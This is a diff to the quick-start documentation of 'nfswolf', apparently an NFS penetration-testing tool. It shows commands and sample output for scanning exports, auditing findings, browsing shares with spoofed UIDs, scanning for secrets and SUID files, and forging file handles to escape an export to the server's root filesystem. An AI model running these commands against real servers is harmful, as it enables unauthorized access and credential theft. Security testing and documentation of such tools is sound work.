@@ -31,33 +31,24 @@ nfswolf scan 10.0.0.1
 ??? example "Example output"
 
     ```
-    NFSWolf v1.2.0 — NFS Security Scanner
+    [*] Scanning 1 host(s)...
+    ╭──────────┬──────────────┬──────────┬───────┬──────────┬───────┬──────────┬───────────┬───────────────────┬─────────╮
+    │ IP       │ RPC Port 111 │ NFS Port │ NFSv3 │ v3 Expts │ NFSv4 │ v4 Expts │ OS        │ Mount Port        │ Clients │
+    ├──────────┼──────────────┼──────────┼───────┼──────────┼───────┼──────────┼───────────┼───────────────────┼─────────┤
+    │ 10.0.0.1 │ open         │ 2049/tcp │ yes   │ 3        │ yes   │ 3+       │ Linux 5.x │ 20048/tcp (v1,v3) │ 2       │
+    ╰──────────┴──────────────┴──────────┴───────┴──────────┴───────┴──────────┴───────────┴───────────────────┴─────────╯
 
-    Target: 10.0.0.1
-
-    ── Services ──────────────────────────────────────────────────────────
-    portmapper    111/tcp    rpcbind v2/v3/v4
-    nfs           2049/tcp   NFSv3, NFSv4
-    mountd        20048/tcp  MOUNT v1/v3
-
-    ── Exports ───────────────────────────────────────────────────────────
-    /srv/nfs         *                  rw,no_root_squash,no_subtree_check
-    /home            10.0.0.0/24        rw,root_squash,subtree_check
-    /var/backups     *(ro)              ro,root_squash,no_subtree_check
-
-    ── Server Info ───────────────────────────────────────────────────────
-    OS fingerprint:    Linux (knfsd)
-    NFS versions:      v3, v4.0
-    Auth flavors:      AUTH_SYS (1), AUTH_UNIX (1)   # trust-based: client states its own identity
-    Portmapper:        46 registered programs
-    MOUNT clients:     2 active mounts
-
-    ── File Handles ──────────────────────────────────────────────────────
-    /srv/nfs       0100 0007 0200 0002 0000 0000 6ea7 1866 ...
-    /home          0100 0007 0200 0002 0000 0000 3f2c 9a01 ...
-    /var/backups   0100 0007 0200 0002 0000 0000 8b14 dd42 ...
-
-    3 exports discovered on 10.0.0.1
+    10.0.0.1
+      RPC services:
+        100000  portmapper    v2,3,4   111/tcp+udp
+        100003  nfs           v3,4     2049/tcp
+        100005  mountd        v1,3     20048/tcp+udp
+      Exports (v3, v4):
+        /srv/nfs                                *                       [AUTH_SYS] fh=0100070002000200...
+        /home                                   10.0.0.0/24             [AUTH_SYS] fh=0100070002000200...
+        /var/backups                            *                       [AUTH_SYS] fh=0100070002000200...
+      Clients: 10.0.0.20:/srv/nfs, 10.0.0.31:/home
+    [*] Done in 412ms  --  1 host(s) scanned, 1 with NFS
     # rerun: nfswolf scan 10.0.0.1
     ```
 
@@ -78,61 +69,53 @@ nfswolf scan 10.0.0.0/24
 
 ## Step 2: Analyze security posture
 
-Run the full security audit against the server:
+Run the full security audit against the server. `--allow-write` adds the squash probes, which create and remove a test file; leave it off and `analyze` never writes, but then it cannot test `no_root_squash` (F-4.1):
 
 ```bash
-nfswolf analyze 10.0.0.1
+nfswolf analyze 10.0.0.1 --allow-write
 ```
 
 ??? example "Example output"
 
     ```
-    NFSWolf v1.2.0 — NFS Security Analyzer
+    +===================================+
+    |  NFS Security Analysis: 10.0.0.1  |
+    +===================================+
 
-    Target: 10.0.0.1
-    Exports analyzed: 3
-    Findings: 12
+      OS:  Linux 5.x  |  NFS:  v3, v4
+      Impl:  Linux knfsd (GARBAGE_ARGS on null-name LOOKUP)
+      Timestamp:  2025-06-12T09:41:07Z
 
-    ── Critical ──────────────────────────────────────────────────────────
+      Exports  -------------------------------------------------
+    ╭──────────────┬─────────────────┬──────────┬────────────────────────┬─────────────────────╮
+    │ Path         │ Allowed clients │ Auth     │ Flags                  │ Handle (partial)    │
+    ├──────────────┼─────────────────┼──────────┼────────────────────────┼─────────────────────┤
+    │ /srv/nfs     │ *               │ AUTH_SYS │ WILDCARD AUTH_SYS_ONLY │ 0100070002000200... │
+    │ /home        │ 10.0.0.0/24     │ AUTH_SYS │ AUTH_SYS_ONLY          │ 0100070002000200... │
+    │ /var/backups │ *               │ AUTH_SYS │ WILDCARD AUTH_SYS_ONLY │ 0100070002000200... │
+    ╰──────────────┴─────────────────┴──────────┴────────────────────────┴─────────────────────╯
 
-    F-1.1  AUTH_SYS UID Spoofing                                CRITICAL
-           Export /srv/nfs accepts AUTH_SYS (trust-based auth where
-           the client states its own user ID without proof).
-           Any client can present arbitrary UID/GID (user/group ID)
-           credentials.
-           Ref: RFC 5531 §14, RFC 2623 §2.1
+      File Handles  --------------------------------------------
+      /srv/nfs: 0100070002000200000000006ea718660ea71866
+      /home: 0100070002000200000000003f2c9a010ea71866
+      /var/backups: 0100070002000200000000008b14dd420ea71866
 
-    F-2.1  no_root_squash Enabled                               CRITICAL
-           Export /srv/nfs has no_root_squash — UID 0 (root) is not
-           mapped to nobody. Remote root has full filesystem access.
-           Ref: exports(5), RFC 1094 §2.3
+      Findings  ------------------------------------------------
+      Findings: 2 critical, 4 high, 1 medium, 3 low/info
 
-    F-2.3  Subtree Check Disabled                               HIGH
-           Export /srv/nfs has no_subtree_check — file handles from
-           other directories on the same filesystem are valid.
-           Ref: exports(5)
-
-    ── High ──────────────────────────────────────────────────────────────
-
-    F-5.1  Export List World-Readable                            HIGH
-           All 3 exports are accessible from any host (*).
-           No IP-based access restrictions configured.
-           Ref: exports(5)
-
-    F-5.6  File Metadata Leaked on Access Denial                MEDIUM
-           Server returns uid, gid, mode, and size in denied responses.
-           Ref: RFC 1813 §3.3
-
-    ... 7 more findings ...
-
-    ── Summary ───────────────────────────────────────────────────────────
-    Critical: 2  |  High: 4  |  Medium: 3  |  Low: 2  |  Info: 1
-    Risk score: 87/100
+      [CRITICAL]  /srv/nfs  F-2.1  Export escape possible -- filesystem root accessible via crafted handle
+        Evidence: constructed ext4 root handle (inode 2) accepted; GETATTR returned a directory
+      [CRITICAL]  /srv/nfs  F-4.1  no_root_squash detected  --  uid=0 credentials not remapped
+        Evidence: probe file created as uid=0 is owned by uid 0
+      [HIGH]      /srv/nfs  F-1.1  Export uses AUTH_SYS only (no Kerberos)
+      [HIGH]      /srv/nfs  F-7.1  Export accessible to all hosts (world-accessible export)
+      [HIGH]      /var/backups  F-7.1  Export accessible to all hosts (world-accessible export)
+      ... 5 more findings ...
 
     # rerun: nfswolf analyze 10.0.0.1
     ```
 
-The analyzer checks for 62 documented security findings across identity attacks, access control bypasses, network exposures, privilege escalation vectors, information disclosures, and configuration weaknesses. Each finding references the specific RFC section or kernel behavior that makes it exploitable.
+The analyzer detects 43 of the 62 documented security findings, across identity attacks, access control bypasses, network exposures, privilege escalation vectors, information disclosures, and configuration weaknesses. Of the rest, the three denial-of-service findings are out of scope and 16 are documented for manual testing. Each finding references the specific RFC section or kernel behavior that makes it exploitable.
 
 ## Step 3: Drop into the shell
 
@@ -145,17 +128,21 @@ nfswolf shell 10.0.0.1:/srv/nfs
 ??? example "Example session"
 
     ```
-    NFSWolf v1.2.0 — NFS Shell
-    Connected to 10.0.0.1:/srv/nfs (NFSv3, AUTH_SYS uid=1000 gid=1000)
+    [*] No --nfs-version specified, probing server...
+    [+] Detected NFSv3 on port 2049
+    [*] Mounting 10.0.0.1:/srv/nfs
+    [+] Connected to 10.0.0.1 as uid=1000 gid=1000   --   type 'help' for commands
 
-    nfs:/srv/nfs> ls
-    drwxr-xr-x  root     root       4096  2025-03-15 09:22  .
-    drwxr-xr-x  root     root       4096  2025-03-15 09:22  ..
-    drwxr-xr-x  www-data www-data   4096  2025-06-01 14:30  webapp
-    -rw-r--r--  root     root       1847  2025-05-20 11:00  config.yml
-    -rw-------  dbadmin  dbadmin   49152  2025-06-10 08:45  database.sqlite
+    nfswolf@10.0.0.1:/ uid=1000 gid=1000> ls
+    mode             uid       gid          size  mtime                name
+    ---------------------------------------------------------------------------
+    drwxr-xr-x         0         0          4096  2025-03-15 09:22:10  .
+    drwxr-xr-x         0         0          4096  2025-03-15 09:22:10  ..
+    drwxr-xr-x        33        33          4096  2025-06-01 14:30:02  webapp
+    -rw-r--r--         0         0          1847  2025-05-20 11:00:45  config.yml
+    -rw-------      1001      1001         49152  2025-06-10 08:45:13  database.sqlite
 
-    nfs:/srv/nfs> cat config.yml
+    nfswolf@10.0.0.1:/ uid=1000 gid=1000> cat config.yml
     # Application configuration
     database:
       host: localhost
@@ -163,31 +150,27 @@ nfswolf shell 10.0.0.1:/srv/nfs
       password: s3cret_db_pass
     ...
 
-    nfs:/srv/nfs> cd webapp
-    nfs:/srv/nfs/webapp> get index.html
-    Downloaded index.html (24576 bytes, sha256:a1b2c3d4...)
+    nfswolf@10.0.0.1:/ uid=1000 gid=1000> cd webapp
+    nfswolf@10.0.0.1:/webapp uid=1000 gid=1000> get index.html
+    saved 24576 bytes -> ./index.html  sha256:a1b2c3d4...
 
-    nfs:/srv/nfs/webapp> whoami
-    uid=1000 gid=1000 groups=1000
+    nfswolf@10.0.0.1:/webapp uid=1000 gid=1000> whoami
+    uid=1000  gid=1000  hostname=localhost
 
-    nfs:/srv/nfs/webapp> suid-scan
-    Scanning for SUID/SGID binaries...
-    -rwsr-xr-x  root  root  16712  /usr/bin/passwd
-    -rwsr-xr-x  root  root  63568  /usr/bin/sudo
-    -rwsr-xr-x  root  root  44528  /usr/bin/chown
-    3 SUID/SGID binaries found
+    nfswolf@10.0.0.1:/webapp uid=1000 gid=1000> suid-scan
+    [*] scanning for SUID/SGID binaries...
+    [!] SUID 4755  uid=0  /webapp/bin/backup-helper
 
-    nfs:/srv/nfs/webapp> secrets-scan
-    Scanning for sensitive files...
-    -rw-------  root   shadow    1204  /etc/shadow          READABLE (via uid=0)
-    -rw-r-----  root   ssl-cert  3247  /etc/ssl/private/server.key
-    -rw-------  root   root       684  /root/.ssh/id_rsa    READABLE (via uid=0)
-    3 sensitive files found
+    nfswolf@10.0.0.1:/webapp uid=1000 gid=1000> secrets-scan
+    [*] scanning for secrets and credentials...
+    [!] potential secret: /webapp/.env  (512 bytes  0644)
+    [!] potential secret: /webapp/config/credentials.json  (318 bytes  0600)
 
-    nfs:/srv/nfs/webapp> exit
+    nfswolf@10.0.0.1:/webapp uid=1000 gid=1000> exit
+    # rerun: nfswolf shell 10.0.0.1:/srv/nfs
     ```
 
-The shell supports 47 commands. Some highlights:
+The shell supports 46 commands, plus 12 aliases. Some highlights:
 
 | Command | Description |
 |---------|-------------|
@@ -215,49 +198,34 @@ nfswolf escape 10.0.0.1:/srv/nfs
 ??? example "Example output"
 
     ```
-    NFSWolf v1.2.0 — Export Escape
+    [*] Escaping 10.0.0.1 (comprehensive)
+    [*] 3 unique seed handle(s) acquired
+    [*] 1214 candidates constructed (deduped from 1630)
+    [*] 2 tree-top(s) confirmed
 
-    Target: 10.0.0.1:/srv/nfs
+      Exports discovered:
+        /srv/nfs                       [MOUNT v3 EXPORT, MOUNT v1 EXPORT, NFSv4 pseudo-FS]
 
-    ── Phase 1: Gathering seed handles ───────────────────────────────────
-    MOUNT v3 /srv/nfs             handle acquired
-    MOUNT v1 /srv/nfs             handle acquired
-    NFSv4 LOOKUP /srv/nfs         handle acquired
+      Seeds acquired: 3 unique handles
+      Candidates constructed: 1214 (deduped from 1630)
+      Tree-tops confirmed: 2 (filtered 1 known export boundaries)
 
-    ── Phase 2: Constructing candidates ──────────────────────────────────
-    Filesystem: ext4 (fsid 0x0007, fileid_type 0x02)
-    Generated 24 candidate root handles
+      Results:
+        [OS-ESCAPE]  inode 2 gen=0 (ext2/3/4, JFS)  via MOUNT v3 /srv/nfs   [v3 v2 v4]  no_root_squash,rw
+             handle: 01000700020000020000000001000000000000006ea718660ea71866
+             ext4 inode 2 gen-based handle; ...
+             rootfs dirs: bin, boot, dev, etc, proc, sys, usr, var (score: 70)
 
-    ── Phase 3: Probing ──────────────────────────────────────────────────
-    Probing 24 candidates across NFSv3...
-      [################] 24/24 — 3 valid handles found
+      1 handle(s) found from 3 seeds. 1 confirmed server rootfs.
 
-    ── Phase 4: Deduplication ────────────────────────────────────────────
-    3 handles -> 1 unique filesystem root
-
-    ── Phase 5: Root filesystem detection ────────────────────────────────
-    Handle 0100070200020000000001000000... resolves to /
-    Confirmed: this is the root filesystem (inode 2, ext4)
-
-    ── Phase 6: Results ──────────────────────────────────────────────────
-
-    ESCAPE SUCCESSFUL — reached filesystem root
-
-    Root handle: 01000007020000020000000001000000000000006ea718660ea71866
-    Filesystem:  ext4, inode 2
-    Access:      full read (uid=0 via no_root_squash)
-
-    Next steps:
-      # Drop into a shell at the filesystem root
-      nfswolf shell 10.0.0.1 --handle 01000007020000020000000001000000000000006ea718660ea71866
-
-      # Read /etc/shadow directly
-      nfswolf escape 10.0.0.1:/srv/nfs --read-shadow
+      Next steps: Copy the handle above and use it with:
+        nfswolf shell 10.0.0.1 --handle 01000700020000020000000001000000000000006ea718660ea71866
+        nfswolf mount 10.0.0.1 /mnt/escape --handle 01000700020000020000000001000000000000006ea718660ea71866
 
     # rerun: nfswolf escape 10.0.0.1:/srv/nfs
     ```
 
-The escape works by manipulating NFS file handles to reference the filesystem root (inode 2) instead of the export directory. It supports 18 of 19 Linux filesystem types. Use the root handle with `nfswolf shell --handle` to explore the entire filesystem.
+The escape works by manipulating NFS file handles to reference the filesystem root (inode 2) instead of the export directory. It constructs root handles for 17 Linux filesystem types; tmpfs is the only tested type that resists. Use the root handle with `nfswolf shell --handle` to explore the entire filesystem.
 
 For a fast single-export check (10-80 RPCs instead of a full sweep):
 
@@ -300,7 +268,7 @@ nfswolf convert -i results.json --format markdown -o findings.md
 
 ## Common options
 
-These global flags apply to every subcommand:
+These global flags apply to every subcommand (`--nfs-version`, in the last example, belongs to `shell` and `mount`):
 
 ```bash
 # Spoof UID/GID — AUTH_SYS is trust-based, so the server believes whatever you send
@@ -318,7 +286,7 @@ nfswolf scan 10.0.0.1 -vvv
 # Route through a SOCKS5 proxy
 nfswolf scan 10.0.0.1 --proxy 127.0.0.1:1080
 
-# Force a specific NFS version
+# Force a specific NFS version (shell and mount only)
 nfswolf shell 10.0.0.1:/srv/nfs --nfs-version 2
 ```
 
@@ -328,7 +296,7 @@ nfswolf shell 10.0.0.1:/srv/nfs --nfs-version 2
 ## What to read next
 
 - [Scan](../usage/scan.md) — Full scanner options, subnet scanning, UDP discovery
-- [Analyze](../usage/analyze.md) — All 62 findings, format options, risk scoring details
+- [Analyze](../usage/analyze.md) — Finding categories, the 43 automated detections, output formats
 - [Shell](../usage/shell.md) — Complete shell command reference, credential escalation, MOUNT bypass
 - [Escape](../usage/escape.md) — Escape algorithm, filesystem support matrix, fast vs full mode
 - [Global Options](../usage/global-options.md) — Every flag that applies across subcommands
